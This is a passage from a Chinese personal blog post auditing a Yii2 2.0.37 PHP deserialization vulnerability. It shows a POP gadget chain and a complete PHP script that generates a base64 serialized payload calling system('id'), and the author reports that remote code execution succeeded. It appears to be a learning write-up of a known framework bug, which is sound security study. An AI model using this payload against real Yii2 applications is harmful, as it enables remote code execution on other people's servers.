+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()</span><br><span class="line">-&gt;</span><br><span class="line">yii\web\DbSession::close()-&gt;MultiFieldSession::composeFields() -&gt; call_user_func()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run() -&gt; call_user_func() -&gt; system(&#x27;id&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;system&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;id&#x27;; </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\web&#123;</span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class DbSession&#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">        function __construct()</span><br><span class="line">&#123;</span><br><span class="line">            $this-&gt;writeCallback = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\db&#123;</span><br><span class="line">    use yii\web\DbSession;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;_dataReader = new DbSession();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $payload = new yii\db\BatchQueryResult();</span><br><span class="line">    echo base64_encode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同样成功rce</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203852908.png" alt="image-20221221203852908"></p>
+<p>ps:前段时间学了php反序列化漏洞 但是这是第一次审计框架的反序列化洞 总体下来还算流畅 主要卡克在composer环境搭建(第一次用掌握的不太好)。pop链子也没有很绕 思路很清晰 也算是小有收获。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># PHP代码审计</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="CTFshow-web入门-反序列化">
+      <i class="fa fa-chevron-left"></i> CTFshow-web入门-反序列化
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lzer0Kx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Lzer0Kx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaobaiakai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xiaobaiakai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lzer0Kx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
